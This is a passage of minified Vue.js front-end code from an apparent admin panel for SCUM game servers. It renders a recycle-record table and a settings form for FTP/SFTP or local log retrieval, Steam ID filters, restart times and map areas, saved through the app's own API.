e.deleteResourceRecycleRecords()}}},[e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("删除选中")]):e._e()],1):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("用户ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.resourceRecycleRecordListFilter.userId,callback:function(t){e.$set(e.resourceRecycleRecordListFilter,"userId",t)},expression:"resourceRecycleRecordListFilter.userId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("商城昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.resourceRecycleRecordListFilter.userName,callback:function(t){e.$set(e.resourceRecycleRecordListFilter,"userName",t)},expression:"resourceRecycleRecordListFilter.userName"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("回收类型:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.resourceRecycleRecordListFilter.type,callback:function(t){e.$set(e.resourceRecycleRecordListFilter,"type",t)},expression:"resourceRecycleRecordListFilter.type"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.resourceRecycleRecordListFilter.timestampStart,e.resourceRecycleRecordListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.resourceRecycleRecordListFilter,"timestampStart",t[0]),e.$set(e.resourceRecycleRecordListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.resourceRecycleRecordListColumns,"data-source":e.resourceRecycleRecordListData,expandedRowKeys:e.expandedResourceRecycleRecordIds,"row-key":"id",pagination:!1,loading:e.loadingResourceRecycleRecordListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedResourceRecycleRecordIds.find((function(e){return e===i.id}))&&e.expandedResourceRecycleRecordIds.push(i.id);else{var a=Object.keys(e.expandedResourceRecycleRecordIds).find((function(t){return e.expandedResourceRecycleRecordIds[t]===i.id}));void 0!==a&&e.expandedResourceRecycleRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"userName",fn:function(t,a){return[a.user?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.user.userName}})}}},[e._v(e._s(a.user?a.user.userName:a.userId))])]:i("span",[e._v(" - ")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.resourceRecycleRecordListPagination.pageSize,current:e.resourceRecycleRecordListPagination.pageNum,total:e.resourceRecycleRecordListPagination.total},on:{change:e.onChangeResourceRecycleRecordListPagination,showSizeChange:e.onShowSizeChangeResourceRecycleRecordListPagination}})],1)])],1)}),[],!1,null,"35ed2eb6",null).exports,Ta={name:"GportalSettings",components:{Loading:w,ImageSelect:De},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,show:!1,Error:Error,loading:!1,edit:!1,saveLoading:!1,originalGameServerType:"",settingsForm:{GameServerType:"",BattleMetricServerId:"",EnableDedicatedGetLogs:!1,FTPServerDetail:"",FTPPath:"",FTPType:"",FTPUrl:"",FTPAccount:"",FTPPassword:"",EnableFTPLogsRollback:!1,FTPLogsRollbackTimeout:null,FTPLogsRollbackInterval:null,FTPServerLogAsyncRecord:{recentTimeStamp:"",result:""},PrivateServerDetail:"",EnablePrivateLogsRollback:!1,PrivateBaseFolderPath:!1,PrivateLogsRollbackTimeout:null,PrivateLogsRollbackInterval:null,PrivateServerLogAsyncRecord:{recentTimeStamp:"",result:""},IsLogUTCTime:!1,ServerLogIgnoreSteamIdList:[],BanLoginKillNotificationSteamIds:[],DiyLoginKillNotification:[],ServerRestartTimeEachDay:[],EnableSignUpSteamIdValidation:!1,NoScumBanSignin:!1,EnableScumBanServerWarning:!1,NoScumBanSigninLimit:3,AutoRenameRegisteredPlayers:!1,StoreRobotScumName:"",StoreRobotSteamId:"",GameMapBorderInfo:{xMax:null,xMin:null,yMax:null,yMin:null},GameMapImageUrl:"",GameAreaRanges:{},SteamAPIToken:""},settingsFormRules:{BattleMetricServerId:[{required:!0,trigger:"change",message:"请输入BattleMetric服务器ID",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入BattleMetric服务器ID"))}}],IsLogUTCTime:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],ServerLogIgnoreSteamIdList:[{required:!0,trigger:"change",message:"请输入17位Steam ID",validator:function(e,t,i){!t||!t.length||t&&t.length&&void 0===t.find((function(e){return!1===/^\d{17}$/.test(e)}))?i():i(new Error("请输入17位Steam"))}}],BanLoginKillNotificationSteamIds:[{required:!0,trigger:"change",message:"请输入17位Steam ID",validator:function(e,t,i){!t||!t.length||t&&t.length&&void 0===t.find((function(e){return!1===/^\d{17}$/.test(e.steamId)}))?i():i(new Error("请输入17位Steam"))}}],DiyLoginKillNotification:[{required:!0,trigger:"change",message:"请正确输入自定义登陆击杀文案（如果自定义击杀/登录文案开关打开，对应的文案不能为空，steam ID集合不能为空）",validator:function(e,t,i){!t||!t.length||t&&t.length&&void 0===t.find((function(e){var t,i,a;return!(null!==(t=e.steamIds)&&void 0!==t&&t.length)&&!e.forAll||void 0!==e.steamIds.find((function(e){return!1===/^\d{17}$/.test(e)}))||e.enableLogin&&!(null!==(i=e.loginRawText)&&void 0!==i&&i.length)||e.enableKill&&!(null!==(a=e.killRawText)&&void 0!==a&&a.length)}))?i():i(new Error("请正确输入自定义登陆击杀文案（如果自定义击杀/登录文案开关打开，对应的文案不能为空，steam ID集合不能为空"))}}],ServerRestartTimeEachDay:[{required:!0,trigger:"change",message:"请输入重启时间(例如: 00:00)",validator:function(e,t,i){!t||!t.length||t&&t.length&&void 0===t.find((function(e){return!1===/^(?:[01]\d|2[0-3])(?::[0-5]\d)$/.test(e)}))?i():i(new Error("请输入重启时间(例如: 00:00)"))}}],EnableSignUpSteamIdValidation:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],NoScumBanSignin:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],EnableScumBanServerWarning:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],NoScumBanSigninLimit:[{required:!0,trigger:"change",message:"请输入阻止联办名单注册/触发进服警告的条件",validator:function(e,t,i){"number"==typeof t&&t>=1?i():i(new Error("请输入阻止联办名单注册/触发进服警告的条件"))}}]},AutoRenameRegisteredPlayers:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],showAddGameAreaRangeZone:!1,addGameAreaRangeZoneInput:"",showUploadConfig:!1,loadingRefreshFTPConfigs:!1,expander:{BanLoginKillNotificationSteamIds:!0,DiyLoginKillNotification:!0,GameAreaRanges:!0}}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getData();case 2:case"end":return t.stop()}}),t)})))()},methods:{getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/gportalSettings"});case 4:i=t.sent,e.loading=!1,200===i.status&&(e.$set(e,"settingsForm",i.data),e.originalGameServerType=i.data.GameServerType),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},onClickEdit:function(){this.show=!0,this.edit=!0},onClickCancelEdit:function(){this.edit=!1,this.getData()},changeGameServerType:function(e){"PRIVATE"===e?(this.settingsForm.FTPServerDetail="",this.settingsForm.FTPPath="",this.settingsForm.FTPType="",this.settingsForm.FTPUrl="",this.settingsForm.FTPAccount="",this.settingsForm.FTPPassword="",this.settingsForm.EnableFTPLogsRollback=!1,this.settingsForm.FTPServerLogAsyncRecord={recentTimeStamp:"",result:""}):"FTP"===e&&(this.settingsForm.PrivateBaseFolderPath="",this.settingsForm.EnablePrivateLogsRollback=!1,this.settingsForm.PrivateServerLogAsyncRecord={recentTimeStamp:"",result:""})},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.originalGameServerType&&e.settingsForm.GameServerType&&e.originalGameServerType!==e.settingsForm.GameServerType?e.$confirm({title:"变更服务器类型确认",content:"这将会清空所有的游戏日志，确定要变更吗",okText:"确定变更",cancelText:"不了，再想想",onOk:function(){e.onClickSaveNormal()}}):e.onClickSaveNormal();case 1:case"end":return t.stop()}}),t)})))()},onClickSaveNormal:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$nextTick((function(){e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=23;break}return(a=Object(A.cloneDeep)(e.settingsForm)).FTPPath&&a.FTPType&&a.FTPUrl&&a.FTPAccount&&a.FTPPassword||(a.EnableFTPLogsRollback=!1),a.PrivateBaseFolderPath||(a.EnablePrivateLogsRollback=!1),e.userInfo&&"sysAdmin"===e.userInfo.role||(delete a.EnableDedicatedGetLogs,delete a.FTPServerDetail,delete a.FTPPath,delete a.FTPType,delete a.FTPUrl,delete a.FTPAccount,delete a.FTPPassword,delete a.PrivateBaseFolderPath),console.log(a),e.saveLoading=!0,t.prev=7,t.next=10,f({method:"PUT",url:e.userInfo&&"sysAdmin"===e.userInfo.role?"/serverConfigAdminSys/updateAllGportalSettings":"/serverConfigAdminSys/updateGportalSettings",data:a});case 10:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=17;break}return e.$message.success("修改成功"),e.edit=!1,t.next=17,e.getData();case 17:t.next=23;break;case 19:t.prev=19,t.t0=t.catch(7),console.error(t.t0),e.saveLoading=!1;case 23:case"end":return t.stop()}}),t,null,[[7,19]])})));return function(e){return t.apply(this,arguments)}}())}));case 1:case"end":return t.stop()}}),t)})))()},onAddGameAreaRangesZone:function(){this.$set(this.settingsForm.GameAreaRanges,this.addGameAreaRangeZoneInput,{xMax:null,xMin:null,yMax:null,yMin:null}),this.showAddGameAreaRangeZone=!1,this.addGameAreaRangeZoneInput=""},removeAddGameAreaRangeZone:function(e){var t={};for(var i in this.settingsForm.GameAreaRanges)i!==e&&(t[i]=this.settingsForm.GameAreaRanges[i]);this.$set(this.settingsForm,"GameAreaRanges",t)},refreshFTPConfigs:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.loadingRefreshFTPConfigs=!0,t.next=4,f({method:"POST",url:"/serverConfigAdminSys/refreshFTPConfigs"});case 4:200===t.sent.status&&(e.loadingRefreshFTPConfigs=!1,e.$message.success("提交成功，下一次获取日志时生效")),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.loadingRefreshFTPConfigs=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Ca=(i("649f"),Object(S.a)(Ta,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto"}},[i("div",{staticStyle:{width:"100%",height:"24px",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("SCUM运营商和服务器设置")]),e.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")]),e.loading?e._e():[e.edit||!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"edit"},on:{click:e.onClickEdit}},[e._v("编辑")]),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"edit",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("保存")]):e._e(),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",disabled:e.saveLoading},on:{click:e.onClickCancelEdit}},[e._v("取消")]):e._e()]],2),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开"))])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%",position:"relative","min-height":"500px",background:"white","overflow-y":"auto"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[e.loading?e._e():i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"1000px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:7},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"游戏服务器类型",prop:"GameServerType",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"游戏服务器类型不能为空",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("游戏服务器类型不能为空"))}}}},[i("a-radio-group",{attrs:{"button-style":"solid"},on:{change:function(t){return e.changeGameServerType(t.target.value)}},model:{value:e.settingsForm.GameServerType,callback:function(t){e.$set(e.settingsForm,"GameServerType",t)},expression:"settingsForm.GameServerType"}},[i("a-radio-button",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role),value:"FTP"}},[e._v("FTP获取模式")]),i("a-radio-button",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role),value:"PRIVATE"}},[e._v("可控私服本地文件获取")])],1),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{"margin-left":"20px"},attrs:{type:"primary",loading:e.loadingRefreshFTPConfigs,icon:"sync"},on:{click:e.refreshFTPConfigs}},[e._v("刷新爬虫FTP配置")]):e._e()],1),i("a-form-model-item",{attrs:{label:"BattleMetric服务器ID",prop:"BattleMetricServerId"}},[i("a-input",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.BattleMetricServerId,callback:function(t){e.$set(e.settingsForm,"BattleMetricServerId",t)},expression:"settingsForm.BattleMetricServerId"}})],1),"FTP"===e.settingsForm.GameServerType?[i("a-form-model-item",{attrs:{label:"服务器FTP基准路径",prop:"FTPPath",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"服务器FTP基准路径不能为空",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("服务器FTP基准路径不能为空"))}}}},[i("a-input",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.FTPPath,callback:function(t){e.$set(e.settingsForm,"FTPPath",t)},expression:"settingsForm.FTPPath"}})],1),i("a-form-model-item",{attrs:{label:"FTP类型",prop:"FTPType",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"FTP类型不能为空",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("FTP类型不能为空"))}}}},[i("a-radio-group",{model:{value:e.settingsForm.FTPType,callback:function(t){e.$set(e.settingsForm,"FTPType",t)},expression:"settingsForm.FTPType"}},[i("a-radio-button",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role),value:"ftp"}},[e._v("FTP")]),i("a-radio-button",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role),value:"sftp"}},[e._v("SFTP")])],1)],1),i("a-form-model-item",{attrs:{label:"FTP Url",prop:"FTPUrl",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"FTP Url不能为空",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("FTP Url不能为空"))}}}},[i("a-input",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.FTPUrl,callback:function(t){e.$set(e.settingsForm,"FTPUrl",t)},expression:"settingsForm.FTPUrl"}})],1),i("a-form-model-item",{attrs:{label:"FTP账号",prop:"FTPAccount",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"FTP账号不能为空",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("FTP账号不能为空"))}}}},[i("a-input",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.FTPAccount,callback:function(t){e.$set(e.settingsForm,"FTPAccount",t)},expression:"settingsForm.FTPAccount"}})],1),i("a-form-model-item",{attrs:{label:"FTP密码",prop:"FTPPassword",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"FTP密码不能为空",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("FTP密码不能为空"))}}}},[i("a-input",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.FTPPassword,callback:function(t){e.$set(e.settingsForm,"FTPPassword",t)},expression:"settingsForm.FTPPassword"}})],1),i("a-form-model-item",{attrs:{label:"获取FTP击杀/登录日志",prop:"EnableFTPLogsRollback",rules:{required:e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword,trigger:"change",message:"请选择",validator:function(t,i,a){e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword&&"boolean"==typeof i||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword)?a():a(new e.Error("请选择"))}}}},[i("a-switch",{attrs:{disabled:!e.edit||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword)},model:{value:e.settingsForm.EnableFTPLogsRollback,callback:function(t){e.$set(e.settingsForm,"EnableFTPLogsRollback",t)},expression:"settingsForm.EnableFTPLogsRollback"}})],1),i("a-form-model-item",{attrs:{label:"FTP超时(ms)",prop:"FTPLogsRollbackTimeout",rules:{required:e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword,trigger:"change",message:"请输入时间间隔",validator:function(t,i,a){e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword&&"number"==typeof i&&i>0||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword)?a():a(new e.Error("请输入时间间隔"))}}}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword)},model:{value:e.settingsForm.FTPLogsRollbackTimeout,callback:function(t){e.$set(e.settingsForm,"FTPLogsRollbackTimeout",t)},expression:"settingsForm.FTPLogsRollbackTimeout"}})],1),i("a-form-model-item",{attrs:{label:"获取FTP日志时间间隔(ms)",prop:"FTPLogsRollbackInterval",rules:{required:e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword,trigger:"change",message:"请输入时间间隔",validator:function(t,i,a){e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword&&"number"==typeof i&&i>0||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword)?a():a(new e.Error("请输入时间间隔"))}}}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword)},model:{value:e.settingsForm.FTPLogsRollbackInterval,callback:function(t){e.$set(e.settingsForm,"FTPLogsRollbackInterval",t)},expression:"settingsForm.FTPLogsRollbackInterval"}})],1),i("a-form-model-item",{attrs:{label:"海外获取FTP日志",prop:"EnableDedicatedGetLogs",rules:{required:e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword&&!1===e.settingsForm.EnableFTPLogsRollback,trigger:"change",message:"请选择",validator:function(t,i,a){e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword&&!1===e.settingsForm.EnableFTPLogsRollback&&"boolean"==typeof i||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword&&!1===e.settingsForm.EnableFTPLogsRollback)?a():a(new e.Error("请选择"))}}}},[i("a-switch",{attrs:{disabled:!e.edit||!(e.settingsForm.FTPPath&&e.settingsForm.FTPType&&e.settingsForm.FTPUrl&&e.settingsForm.FTPAccount&&e.settingsForm.FTPPassword)},model:{value:e.settingsForm.EnableDedicatedGetLogs,callback:function(t){e.$set(e.settingsForm,"EnableDedicatedGetLogs",t)},expression:"settingsForm.EnableDedicatedGetLogs"}})],1),i("a-form-model-item",{attrs:{label:"FTP获取记录和结果",prop:"FTPServerLogAsyncRecord"}},[e.settingsForm.FTPServerLogAsyncRecord&&e.settingsForm.FTPServerLogAsyncRecord.recentTimeStamp&&e.settingsForm.FTPServerLogAsyncRecord.result?[i("div",[i("span",[e._v("最近一次获取时间：")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 136px)"},attrs:{disabled:"",value:e.moment(parseInt(e.settingsForm.FTPServerLogAsyncRecord.recentTimeStamp)).format("YYYY-MM-DD HH:mm:ss")}})],1),i("div",{staticStyle:{"margin-top":"10px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("结果：")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 52px)"},attrs:{type:"textarea","auto-size":{minRows:3,maxRows:3},disabled:"",value:e.settingsForm.FTPServerLogAsyncRecord.result}})],1)]:[e._v("无")]],2)]:e._e(),"PRIVATE"===e.settingsForm.GameServerType?[i("a-form-model-item",{attrs:{prop:"PrivateBaseFolderPath",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"日志文件夹根目录路径不能为空",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("日志文件夹根目录路径不能为空"))}}}},[i("template",{slot:"label"},[i("span",[e._v("日志文件夹根目录路径")]),i("a-tooltip",{attrs:{placement:"left",title:"注意：Windows系统路径使用正斜杠，Linux系统路径使用反斜杠"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.PrivateBaseFolderPath,callback:function(t){e.$set(e.settingsForm,"PrivateBaseFolderPath",t)},expression:"settingsForm.PrivateBaseFolderPath"}})],2),i("a-form-model-item",{attrs:{label:"获取私服击杀/登录日志",prop:"EnablePrivateLogsRollback",rules:{required:e.settingsForm.PrivateBaseFolderPath,trigger:"change",message:"请选择",validator:function(t,i,a){e.settingsForm.PrivateBaseFolderPath&&"boolean"==typeof i||!e.settingsForm.PrivateBaseFolderPath?a():a(new e.Error("请选择"))}}}},[i("a-switch",{attrs:{disabled:!e.edit||!e.settingsForm.PrivateBaseFolderPath},model:{value:e.settingsForm.EnablePrivateLogsRollback,callback:function(t){e.$set(e.settingsForm,"EnablePrivateLogsRollback",t)},expression:"settingsForm.EnablePrivateLogsRollback"}})],1),i("a-form-model-item",{attrs:{label:"超时(ms)",prop:"PrivateLogsRollbackTimeout",rules:{required:e.settingsForm.PrivateBaseFolderPath,trigger:"change",message:"请输入时间间隔",validator:function(t,i,a){e.settingsForm.PrivateBaseFolderPath&&"number"==typeof i&&i>0||!e.settingsForm.PrivateBaseFolderPath?a():a(new e.Error("请输入时间间隔"))}}}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!e.settingsForm.PrivateBaseFolderPath},model:{value:e.settingsForm.PrivateLogsRollbackTimeout,callback:function(t){e.$set(e.settingsForm,"PrivateLogsRollbackTimeout",t)},expression:"settingsForm.PrivateLogsRollbackTimeout"}})],1),i("a-form-model-item",{attrs:{label:"获取私服日志时间间隔(ms)",prop:"PrivateLogsRollbackInterval",rules:{required:e.settingsForm.PrivateBaseFolderPath,trigger:"change",message:"请输入时间间隔",validator:function(t,i,a){e.settingsForm.PrivateBaseFolderPath&&"number"==typeof i&&i>0||!e.settingsForm.PrivateBaseFolderPath?a():a(new e.Error("请输入时间间隔"))}}}},[i("a-input-number",{attrs:{min:0,disabled:!e.edit||!e.settingsForm.PrivateBaseFolderPath},model:{value:e.settingsForm.PrivateLogsRollbackInterval,callback:function(t){e.$set(e.settingsForm,"PrivateLogsRollbackInterval",t)},expression:"settingsForm.PrivateLogsRollbackInterval"}})],1),i("a-form-model-item",{attrs:{label:"私服获取记录和结果",prop:"PrivateServerLogAsyncRecord"}},[e.settingsForm.PrivateServerLogAsyncRecord&&e.settingsForm.PrivateServerLogAsyncRecord.recentTimeStamp&&e.settingsForm.PrivateServerLogAsyncRecord.result?[i("div",[i("span",[e._v("最近一次获取时间：")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 136px)"},attrs:{disabled:"",value:e.moment(parseInt(e.settingsForm.PrivateServerLogAsyncRecord.recentTimeStamp)).format("YYYY-MM-DD HH:mm:ss")}})],1),i("div",{staticStyle:{"margin-top":"10px"}},[i("span",{staticStyle:{"vertical-align":"top"}},[e._v("结果：")]),i("a-input",{staticStyle:{"margin-left":"10px",width:"calc(100% - 52px)"},attrs:{type:"textarea","auto-size":{minRows:3,maxRows:3},disabled:"",value:e.settingsForm.PrivateServerLogAsyncRecord.result}})],1)]:[e._v("无")]],2)]:e._e(),e._e(),i("a-form-model-item",{attrs:{label:"获取日志过滤的Steam ID",prop:"ServerLogIgnoreSteamIdList"}},[i("a-select",{attrs:{mode:"tags",disabled:!e.edit},model:{value:e.settingsForm.ServerLogIgnoreSteamIdList,callback:function(t){e.$set(e.settingsForm,"ServerLogIgnoreSteamIdList",t)},expression:"settingsForm.ServerLogIgnoreSteamIdList"}})],1),i("a-form-model-item",{attrs:{label:"屏蔽登陆击杀查询播报的Steam ID",prop:"BanLoginKillNotificationSteamIds"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.BanLoginKillNotificationSteamIds.push({steamId:"",banLogin:!0,banKill:!0})}}},[e._v("添加 